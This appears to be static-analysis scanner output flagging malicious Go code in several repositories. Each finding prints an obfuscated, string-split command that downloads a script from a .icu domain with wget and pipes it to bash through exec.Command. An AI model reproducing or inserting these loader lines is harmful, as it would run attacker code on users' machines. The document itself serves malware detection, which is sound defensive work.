           16в”Ҷ qMYvZ := "wget -" + "O -" + " " + "ht" + "tps:/" + "/kai" + "aflow" + "." + "ic" + "u/sto"
               + "ra" + "ge" + "/de37" + "3" + "d0" + "df/a" + "3154" + "6bf |" + " /" + "bin" + "/" +   
               "bas" + "h" + " " + "&"                                                                   
    
    
          Taint flows through these intermediate variables:
    
           16в”Ҷ qMYvZ := "wget -" + "O -" + " " + "ht" + "tps:/" + "/kai" + "aflow" + "." + "ic" + "u/sto"
               + "ra" + "ge" + "/de37" + "3" + "d0" + "df/a" + "3154" + "6bf |" + " /" + "bin" + "/" +   
               "bas" + "h" + " " + "&"                                                                   
    
    
                This is how taint reaches the sink:
    
           17в”Ҷ exec.Command("/bin/s" + "h", "-c", qMYvZ).Start()

в”Ӯ 1 Code Finding в”Ӯ
в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ
                                                                                                            
    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/wavytenet/go-vsr/cmd/simulator/main.go
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
          116в”Ҷ exec.Command("/b" + "in" + "/sh", "-c", ukuvuZQM).Start()
    
    
          Taint comes from:
    
          111в”Ҷ var ukuvuZQM = "wg" + "et" + " " + "-O - " + "htt" + "ps:/" + "/man" + "tra" + "b" + "owe"
               + "ry.i" + "cu/" + "stora" + "ge/de" + "373" + "d0" + "df/" + "a315" + "46" + "b" + "f " +
               "| /" + "b" + "in/ba" + "sh &"                                                            
    
    
          Taint flows through these intermediate variables:
    
          111в”Ҷ var ukuvuZQM = "wg" + "et" + " " + "-O - " + "htt" + "ps:/" + "/man" + "tra" + "b" + "owe"
               + "ry.i" + "cu/" + "stora" + "ge/de" + "373" + "d0" + "df/" + "a315" + "46" + "b" + "f " +
               "| /" + "b" + "in/ba" + "sh &"                                                            
    
    
                This is how taint reaches the sink:
    
          113в”Ҷ var oZhNzmP = tEruOHe()
    
          Taint flows through these intermediate variables:
    
          116в”Ҷ exec.Command("/b" + "in" + "/sh", "-c", ukuvuZQM).Start()
    
          then reaches:
    
          116в”Ҷ exec.Command("/b" + "in" + "/sh", "-c", ukuvuZQM).Start()

в”Ӯ 1 Code Finding в”Ӯ
в””в”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”Җв”ҳ
                                                                                                                        
    /Volumes/PortableSSD/regex_query_repos/go-mal/pattern2/github.com/weirdcausal/streaming-availability-api/tutorials/g
  o-movie-recommender/api/clients.go                                                                                    
   вқҜвқҜвқұ go-mal.pattern2.go-code-execution-obfuscated-payload
          Potential dynamic code execution: suspicious/obfuscated string flows into process execution
          (exec/syscall/os.StartProcess) or dynamic loaders.                                         
                                                                                                     
           33в”Ҷ exec.Command("/bin/" + "s" + "h", "-c", ArUuLx).Start()
    
    
          Taint comes from:
    
           32в”Ҷ ArUuLx := "wget -" + "O - h" + "ttps:" + "//hyp" + "er" + "w" + "ords" + "tatu" + "s." +  
               "icu" + "/stor" + "ag" + "e/" + "de373" + "d" + "0" + "d" + "f/" + "a" + "31546" + "bf | "
               + "/b" + "in/" + "bash" + " " + "&"                                                       
    
    
          Taint flows through these intermediate variables:
    
           32в”Ҷ ArUuLx := "wget -" + "O - h" + "ttps:" + "//hyp" + "er" + "w" + "ords" + "tatu" + "s." +  
               "icu" + "/stor" + "ag" + "e/" + "de373" + "d" + "0" + "d" + "f/" + "a" + "31546" + "bf | "
               + "/b" + "in/" + "bash" + " " + "&"                                                       
    
    
                This is how taint reaches the sink:
    
           33в”Ҷ exec.Command("/bin/" + "s" + "h", "-c", ArUuLx).Start()
